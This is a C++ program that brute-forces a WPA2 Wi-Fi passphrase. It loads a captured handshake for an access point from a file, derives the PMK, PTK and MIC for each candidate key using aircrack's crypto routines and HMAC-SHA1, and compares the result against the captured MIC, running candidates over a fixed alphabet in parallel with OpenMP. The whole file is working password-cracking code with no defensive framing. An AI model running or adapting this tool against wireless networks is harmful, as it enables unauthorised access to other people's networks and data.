

#include "brute_forcer.h"
#include "openmp_engine.h"
#include <stdio.h>

extern "C"
{
	#include "aircrack/crypto.h"
	#include "aircrack/include/eapol.h"
}

void print_binary_buffer(const unsigned char * buffer, unsigned size)
{
	for(unsigned i = 0; i < size; ++i)
		printf("%02X:", buffer[i]);
}

struct ap_data_t
{
	char essid[36];
	unsigned char bssid[6];
	WPA_hdsk hs;
};

struct wpa2_crypter
{
	using value_t = bool;

	wpa2_crypter(const ap_data_t & ap_data)
		:apData(ap_data)
	{
		memset(key, 0, 128);

		/* pre-compute the key expansion buffer */
		memcpy( pke, "Pairwise key expansion", 23 );
		if( memcmp( apData.hs.stmac, apData.bssid, 6 ) < 0 )	{
			memcpy( pke + 23, apData.hs.stmac, 6 );
			memcpy( pke + 29, apData.bssid, 6 );
		} else {
			memcpy( pke + 23, apData.bssid, 6 );
			memcpy( pke + 29, apData.hs.stmac, 6 );
		}
		if( memcmp( apData.hs.snonce, apData.hs.anonce, 32 ) < 0 ) {
			memcpy( pke + 35, apData.hs.snonce, 32 );
			memcpy( pke + 67, apData.hs.anonce, 32 );
		} else {
			memcpy( pke + 35, apData.hs.anonce, 32 );
			memcpy( pke + 67, apData.hs.snonce, 32 );
		}

		//print_binary_buffer(pke, 100);
	}
	
	value_t operator()(const std::string & code) const
	{
		memcpy(key, code.data(), code.size());

		

		//cout << "Calculating PMK..." << std::endl;

		calc_pmk(key, apData.essid, tmp.pmk);

		/*print_binary_buffer((unsigned char*)key, 128);
		cout << std::endl;
		print_binary_buffer((unsigned char*)essid, 36);
		cout << std::endl;
		print_binary_buffer((unsigned char*)pmk, 128);*/

		for (unsigned i = 0; i < 4; i++)
		{
			pke[99] = i;
			HMAC(EVP_sha1(), tmp.pmk, 32, pke, 100, tmp.ptk + i * 20, NULL);
		}

		//print_binary_buffer((unsigned char*)ptk, 80);

		HMAC(EVP_sha1(), tmp.ptk, 16, apData.hs.eapol, apData.hs.eapol_size, tmp.mic, NULL);

		//cout << std::endl << "res=" <<  << std::endl;

		return (memcmp(tmp.mic, apData.hs.keymic, 16) == 0);
	}

	mutable unsigned char pke[100];
	mutable char key[128];

	mutable struct
	{
		unsigned char pmk[128];
		unsigned char ptk[80];
		unsigned char mic[20];
	} tmp;

	ap_data_t apData;
};

//md5 of 'grape': b781cbb29054db12f88f08c6e161c199

using bf_t = brute_forcer<wpa2_crypter>;

int main(int argc, char ** argv)
{
	ap_data_t ap_data;

	FILE * tmpFile = fopen("ap_ZyXEL.hshk", "rb");
	fread(ap_data.essid, 36, 1, tmpFile);
	fread(ap_data.bssid, 6, 1, tmpFile);
	fread(&ap_data.hs, sizeof(struct WPA_hdsk), 1, tmpFile);
	fclose(tmpFile);

	wpa2_crypter crypter(ap_data);
	//crypter("yuraho4etkushat'");

	std::string alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_'";
	bf_t bforcer(crypter, true, alphabet);

	//cout << big_uint(bforcer.get_key_id("yuraho4etkushat'")) << std::endl;
	//cout << big_uint(bforcer.get_key_id("ax'")) << std::endl;

	//a85918ae8838727c5551
	big_uint start_key_id("0a850918ae8838727c5150");
	//cout << "XXX:" << bforcer.get_ekey(start_key_id.data) << std::endl;

	openmp_engine<bf_t> eng(bforcer);
	eng.chunkSize = 100;
	eng(start_key_id.data);

	return 0;
}

